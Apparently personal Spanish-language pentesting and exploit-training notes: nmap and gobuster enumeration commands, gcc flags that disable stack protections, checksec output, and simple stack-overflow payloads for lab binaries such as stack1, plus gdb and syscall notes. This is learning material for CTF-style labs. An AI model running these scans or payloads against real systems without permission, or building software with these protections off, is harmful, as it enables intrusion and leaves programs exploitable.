


NMAP
====================================================================================================================================================================
nmap 10.10.11.152 -sV -sC -Pn

nmap -Pn -n -sV --script vuln <IP>



nikto and gobuster: Listan directorios Web

$ for i in files directories; do gobuster dir -t 30 -u $RHOST -w /opt/wordlists/seclists/Discovery/Web-Content/raft-medium-$i.txt -o enum/web/gobuster-80-rm${i:0:1}.txt; done

wpscan - Para escanera WordPress

https://khaoticdev.net/hack-the-box-backdoor/


gcc -m32 -no-pie -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o stack1 stack1.c

CHECKSEC
BEFORE ================================================================================================================================================================
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   42) Symbols       No    0               2               abo4-stin

AFTER ================================================================================================================================================================

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   42) Symbols       No    0               2               abo4-stin

====================================================================================================================================================================

COMPILAR SIN PROTECCIONES
========================
gcc -fno-stack-protector -z execstack -g -o abo4-stin abo4-stin.c

gcc -m32 -no-pie -fno-stack-protector -ggdb -mpreferred-stack-boundary=3 -z execstack -o stack1 stack1.c

PROTECCIONES
------------
-fno-stack-protector: CANARY
-z execstack :  HACER PILA EXECUTABLE
-no-pie      :  EJECUCIÓN INDEPENDIENTE DE LA POSICIÓN

-mpreferred-stack-boundary=3


COMPILADO DEPURADOR
-------------------
Como lo compilamos con gcc -g, se puede desensamblar el programa intercalado con el código fuente con objdump -M intel -S stack1.

GUIA DE EXPLOITS
---------------------------------------------------------------------------------------------------------------------------------------------------------------------

NIVEL1
---

#!/usr/bin/python
output = "A" * 80 + "\x44\x43\x42\x41"
print output

Y al ejecutar el programa con ese input logramos el mismo resultado:

user@abos:~$ python exploit.py |./stack1
buf: bffff5b4 cookie: bffff604
you win!

DIFERENTES FORMAS DE INTRODUCIR DATOS A LOS STACKS
python -c 'print ("DCBA" * 26 + "\x44\x43\x42\x41")' | ./stack1 

python -c 'print("\x05\x03\x02\x01" * 24)'  > input.txt
./stack2 < input.txt

python -c 'print("\x05\x00\x02\x01" * 24)'  | ./stack3 


INTRODUCIR DATOS EN GDB
---
user@u:~$ python exploit.py > inpython -c 'print("\x05\x00\x02\x01" * 24)'  | ./stack3 

user@u:~$ gdb ./stack1
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
...
(gdb) r < in
buf: bffff5b4 cookie: bffff604
you win!


LLAMADAS AL SISTEMA
En Linux cada llamada toma sus argumentos de los registros según el siguiente criterio:

eax => nro de syscall
ebx => 1er argumento
ecx => 2do argumento
edx => 3er argumento 

Para saber el número que corresponde a cada syscall se puede consultar: /usr/include/asm/unistd_32.h
